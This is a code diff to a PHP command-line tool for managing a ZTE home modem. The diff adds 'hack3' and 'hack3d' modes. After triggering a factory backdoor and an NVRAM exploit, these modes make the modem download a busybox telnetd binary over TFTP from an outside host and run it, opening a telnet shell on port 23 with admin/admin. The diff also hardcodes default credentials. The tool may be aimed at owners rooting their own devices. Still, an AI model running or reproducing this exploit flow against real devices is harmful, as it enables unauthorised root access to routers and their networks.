@@ -2,8 +2,8 @@
 
 require "vendor/autoload.php";
 
-$modem_ip = '';
-$passwd = '';
+$modem_ip = '192.168.0.1';
+$passwd = 'admin';
 
 if ( (strlen($modem_ip)<1) && (strlen($passwd)<1) ) {
   echo "Please set your modem_ip (Ex: 192.168.0.1) and set your password\n";
@@ -28,13 +28,18 @@ if (!array_key_exists(1, $argv)) {
   echo "-----|--------|---------|\n";
   echo "wan  | on/off |         | => Enable or Disable WAN\n";
   echo "-----|--------|---------|\n";
-  echo "hack |        |         | => Hack Modem\n";
+  echo "hack |        |         | => Hack Modem (Method 2, built-in telnetd)\n";
+  echo "-----|--------|---------|\n";
+  echo "hack3| TftpIP |         | => Hack Modem (Method 3, zte_debug.sh, default IP: 192.168.0.22)\n";
+  echo "-----|--------|---------|\n";
+  echo "hack3d|TftpIP |         | => Hack Modem (Method 3 direct tftp cmd, default IP: 192.168.0.22)\n";
   echo "-----|--------|---------|\n";
   exit;
 }
 
 if ( ($argv[1]!='login') && ($argv[1]!='ls') && ($argv[1]!='rm') && ($argv[1]!='snd')
-  && ($argv[1]!='wifi') && ($argv[1]!='wan') && ($argv[1]!='hack') ) {
+  && ($argv[1]!='wifi') && ($argv[1]!='wan') && ($argv[1]!='hack') && ($argv[1]!='hack3')
+  && ($argv[1]!='hack3d') ) {
     echo "How to use:\n";
     echo "arg1 |  arg2  |   arg3  |\n";
     echo "-----|--------|---------|\n";
@@ -52,7 +57,11 @@ if ( ($argv[1]!='login') && ($argv[1]!='ls') && ($argv[1]!='rm') && ($argv[1]!='
     echo "-----|--------|---------|\n";
     echo "wan  | on/off |         | => Enable or Disable WAN\n";
     echo "-----|--------|---------|\n";
-    echo "hack |        |         | => Hack Modem\n";
+    echo "hack |        |         | => Hack Modem (Method 2, built-in telnetd)\n";
+    echo "-----|--------|---------|\n";
+    echo "hack3| TftpIP |         | => Hack Modem (Method 3, zte_debug.sh, default IP: 192.168.0.22)\n";
+    echo "-----|--------|---------|\n";
+    echo "hack3d|TftpIP |         | => Hack Modem (Method 3 direct tftp cmd, default IP: 192.168.0.22)\n";
     echo "-----|--------|---------|\n";
     exit;
   }
@@ -254,16 +263,64 @@ if ($argv[1] == 'wan') {
 }
 
 use ZTE\Hack;
-// Hack Modem
+// Hack Modem - Method 2 (requires built-in telnetd in busybox)
 if ( ($argv[1] == 'hack')) {
+
+  // Login first
+  $login = new Login($modem_ip, 'IN', $passwd);
+  $ret = $login->login_logout();
+  var_dump($ret);
 
   $hack = new Hack($modem_ip, $passwd);
   $back = $hack->factory_backdoor();
   var_dump($back);
-  $root = $hack->enable_root_access();
-  var_dump($root);
   $nvram = $hack->exploits_nvram();
   var_dump($nvram);
+
+  // Do Logout
+  $login = new Login($modem_ip, 'OUT', $passwd);
+  $login->login_logout();
+}
+
+// Hack Modem - Method 3 (TFTP, for firmware without built-in telnetd)
+// Prerequisites: TFTP server running at TftpIP with a MIPS busybox binary
+// named "telnetd" in its root. Telnetd will listen on port 23 (admin/admin).
+if ( ($argv[1] == 'hack3')) {
+
+  $tftp_ip = array_key_exists(2, $argv) ? $argv[2] : '192.168.0.22';
+
+  // Login first
+  $login = new Login($modem_ip, 'IN', $passwd);
+  $ret = $login->login_logout();
+  var_dump($ret);
+
+  $hack = new Hack($modem_ip, $passwd);
+  $back = $hack->factory_backdoor();
+  var_dump($back);
+  $tftp = $hack->tftp_telnetd($tftp_ip);
+  var_dump($tftp);
+
+  // Do Logout
+  $login = new Login($modem_ip, 'OUT', $passwd);
+  $login->login_logout();
+}
+
+// Hack Modem - Method 3 direct (fallback if zte_debug.sh is not present)
+// Uses raw busybox tftp command to fetch and execute telnetd.
+if ( ($argv[1] == 'hack3d')) {
+
+  $tftp_ip = array_key_exists(2, $argv) ? $argv[2] : '192.168.0.22';
+
+  // Login first
+  $login = new Login($modem_ip, 'IN', $passwd);
+  $ret = $login->login_logout();
+  var_dump($ret);
+
+  $hack = new Hack($modem_ip, $passwd);
+  $back = $hack->factory_backdoor();
+  var_dump($back);
+  $tftp = $hack->tftp_telnetd_direct($tftp_ip);
+  var_dump($tftp);
 
   // Do Logout
   $login = new Login($modem_ip, 'OUT', $passwd);
